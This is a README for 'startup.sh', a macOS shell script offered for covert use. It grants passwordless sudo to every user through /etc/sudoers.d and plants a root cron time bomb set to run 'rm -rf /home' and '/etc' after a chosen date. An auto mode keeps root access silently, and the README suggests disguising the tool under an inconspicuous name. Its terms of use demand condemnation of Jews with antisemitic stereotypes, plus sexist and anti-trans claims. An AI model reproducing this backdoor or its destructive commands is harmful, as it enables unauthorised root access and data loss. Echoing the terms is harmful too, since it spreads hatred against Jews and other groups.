# `startup.sh`
## A MacOS Shell Script

Note: sudo privileges are required. For educational purposes only. Do not use maliciously.

## Requirements
You must have some prerequisites before installing/running this script:
- A MacOS machine
- Access to sudo
- git (installed by default)
- cron (installed by default)

## Installation
Clone this repository, preferably, but not necessarily in the `/opt` directory:
```sh
# git clone https://github.com/eccys/startup.sh
# cd startup.sh
```
Make it executable:
```sh
sudo chmod +x startup.sh
```
Run it:
```sh
./startup.sh
```

## Usage

Upon running and entering your sudo password, one is greeted with some information and options, which are self explanatory:
```sh
[root@hostname /opt]# ./startup.sh

List of super users: root
Passwordless sudo enabled: No
isti'la is disabled

Options:
1 = Toggle someone sudo
2 = Toggle sudo password requirement
3 = Enable/Disable isti'la

Select an option or press any other key to quit: 
```

If isti'la is enabled, the isti'la date is shown.

### Toggle someone sudo
On selecting this option, it will prompt for a user's username. The user is made into an administrator. This is safer than __Passwordless sudo__.

### Passwordless sudo
This writes to a file, `/etc/sudoers.d/nopasswd_for_all`, which contains the line `ALL ALL=(ALL) NOPASSWD: ALL`. It allows for anyone, even non-administrators, to use `sudo` and execute programs and/or commands as root. 

This works very well, as by default, the `/etc/sudoers` extends `/etc/suoders.d/`. It is very dangerous, and should never be left on, unless of course.. it is the desired outcome ;)

### Isti'la

Istila is a turkish word. This option is different from others, as it is coined solely for destruction.

#### What isti'la does
When enabling isti'la, it will prompt for a date. in the format `YYYYMMDDHH`. (e.g., `2024120112` for December 1st, 2024, 12PM.)

If enabled, isti'la writes the date to `/etc/isti'la_enabled`, and establishes a cron task in the root user's crontab, running every minute checking if the current date is greater than or equal to the isti'la date.

If it is, the commands specified in the script are executed:

```sh
# Function to execute isti'la if conditions are met
execute_istila() {
    if [ -f /etc/istila_enabled ]; then
        CURRENT_DATE=$(date +%Y%m%d%H)  # Convert current date to an integer format
        ISTILA_DATE=$(cat /etc/istila_enabled)

        if [ "$CURRENT_DATE" -ge "$ISTILA_DATE" ]; then
            if [ "$AUTO_MODE" != "true" ]; then
                echo "Executing isti'la..."
            fi
            # Uncomment the lines below to enable isti'la actions
            echo Successfully executed cron job and istila operation | sudo tee -a /opt/test >/dev/null
            # sudo rm -rf /home
            # sudo rm -rf /etc
        else
            if [ "$AUTO_MODE" != "true" ]; then
                echo "isti'la date has not yet arrived."
            fi
        fi
    fi
}
```

It is very useful for executing certain actions after a specified "doomsday" has passed.

> [!IMPORTANT]
> Commands such as `sudo rm -rf --no-preserve-root` are futile on MacOS environments with [System Integrity Protection](https://support.apple.com/en-us/102149) enabled. Likewise, any operation which seeks to modify files in `/bin`, `/sbin`, `/System`, `/var`, or `/usr`.

## Auto mode

The script supports the `-auto` flag. Execute:
```sh
./startup.sh -auto
```
Upon running the script in auto mode, __Passwordless sudo__ is automatically enabled, and that's it. 

Very useful for scenarios where someone types in their sudo password and their cooldown has not yet expired, and one wishes to retain sudo access silently. One may fork this repository and rename it to something inconspicuous, or use it as part of their own project. Running it in auto mode is inherently inconspicuous itself, as only a single word is printed: `Done.`.

### Isti'la with auto mode

The auto flag supports enabling isti'la automatically, via an argument. For example:
```sh
./startup.sh -auto 2024120112
```
will enable __Passwordless sudo__ as well as isti'la with the date `2024120112` (December 1st, 2024, 12PM). If all processes are executed successfully, one line is printed: `Done. isti'la date: <date>. Cron job is successful.`.

It is also very inconspicuous. Passwordless sudo is enabled regardless, as it is required for the cron job to be able to execute commands prefixed with `sudo`. However, this is not true, as it writes the cron job to the root user's crontab.

## Terms of use

By use of this software or any portion of it, the user accepts the following:

1. You condemn Israel and jews due to their stubbornness in accepting the truth due to their pride and selfishness, ingratitude for things which they have and did not work for, and their stinginess in spending their wealth for others. Also for attacking Palestine.
2. Men have the duty to provide for their household and protect them from harm, and women have the duty to care for and have love solely for her husband and her children, save for her relatives.
3. Feminism and the practice thereof is conducive to nothing, save the fabrication of nonsensical ideologies.
4. Abortion and the killing of one's children is unjust.
5. There are 2 genders.


Notes regarding the __Terms of Service__:
If the project is forked, implemented, or used in programs other than its own for discrete use or not for discrete use, the __Terms of Service__ need not be copied over.

Pull requests and issues regarding extending functionality or correcting unexpected behavior are welcome.
